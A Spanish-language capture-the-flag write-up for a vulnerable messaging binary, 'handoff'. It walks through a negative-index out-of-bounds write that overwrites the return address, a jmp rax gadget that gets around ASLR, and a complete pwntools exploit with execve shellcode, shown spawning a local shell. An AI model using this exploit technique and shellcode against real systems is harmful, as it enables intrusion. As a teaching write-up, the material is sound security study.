En este ejercicio nos dan un binario y su código fuente:

```c
./handoff
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
3
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it:
hola
```

Parece un programa de mensajería donde podemos añadir contactos y enviar mensajes. Vamos a ver el código:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}

```

Vale, ahora entendemos mejor el funcionamiento del programa. Podemos ver que está programado raro y que hay tamaños que no son consistentes:

```c
#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;


char feedback[8];
fgets(feedback, NAME_LEN, stdin);
```

Ahí ya hay varios overflows con los que podemos intentar llegar a la direccion de retorno y intentar un **ret2shellcode**. Lo que pasa es que no tenemos leak del stack. Aun así podriamos solucionar esto con un ret2reg si se diesen las condiciones. Si seguimos observando podremos ver donde está el fallo mas interesante:

```c
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) { // Aquí
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
```

Como podemos ver hay un check para chequear si metemos un numero de contacto invalido. Pero este solo bloquea los casos en los que nos pasamos de index, no en los index negativos. Con lo cual si ponemos `-1` o algun numero menor es posible que el campo `msg` sobreescriba el return address. Este OOB es mucho mas valioso que el de feedback por ejemplo porque hay mucho espacio en msg ya que es de 64 bytes.

Vamos a testear si msg llega al return address y si deja espacio suficiente para un shellcode:

```c
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
2
Which recipient would you like to send a message to?
-1
What message would you like to send them?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

RSP  0x7fffffffdae8 ◂— 'faaaaaaagaaaaaaahaaaaaa'

cyclic -l faaaaaaa
Found at offset 40
```

Perfecto! Tenemos bastante espacio para meter un shellcode y luego poner la direccíon de retorno del shellcode. 

Aquí surge el ultimo problema. No tenemos leak del stack así que no sabemos donde queda nuestro shellcode por culpa del ASLR. Pero aquí viene algo interesante:

```c
fgets(entries[choice].msg, MSG_LEN, stdin);
```

La función que usa el programa para meter nuestro payload es un fgets. fgets tiene un efecto de dejar en RAX la dirección a nuestro input, y...

```
pwndbg> rop
...
0x0040116c : jmp rax
```

Todo encaja! Vamos a hacer el exploit:

```c
exe = './handoff'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

shellcode = asm('\n'.join([

    'mov rbx, %d' % u64(b'/bin/sh\0'),
    'push rbx',
    'mov rdi, rsp',
    'xor rsi, rsi',
    'xor rdx, rdx',
    'mov rax, 59',
    'syscall'
]))

padding = 40

jmp_rax = p64(0x000000000040116c)

info(f'Longitud shellcode: {len(shellcode)}')

io = start()

io.recvline(b'app\n')
io.sendline(b'2')
io.sendlineafter(b'to?\n', b'-1')

io.recvline(b'them?\n')
io.sendline(shellcode.ljust(padding, b'\x00') + jmp_rax)
```

```c
python3 solve.py
[DEBUG] Received 0x6a bytes:
    b'What option would you like to do?\n'
    b'1. Add a new recipient\n'
    b'2. Send a message to a recipient\n'
    b'3. Exit the app\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x35 bytes:
    b'Which recipient would you like to send a message to?\n'
[DEBUG] Sent 0x3 bytes:
    b'-1\n'
[DEBUG] Received 0x2a bytes:
    b'What message would you like to send them?\n'
[DEBUG] Sent 0x31 bytes:
    00000000  48 bb 2f 62  69 6e 2f 73  68 00 53 48  89 e7 48 31  │H·/b│in/s│h·SH│··H1│
    00000010  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  05 00 00 00  │·H1·│H··;│····│····│
    00000020  00 00 00 00  00 00 00 00  6c 11 40 00  00 00 00 00  │····│····│l·@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x7 bytes:
    b'ub1cu0\n'
ub1cu0
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2e bytes:
    b'handoff  handoff.c  handoff_patched  solve.py\n'
handoff  handoff.c  handoff_patched  solve.py
```

Funciona! Gracias por leer.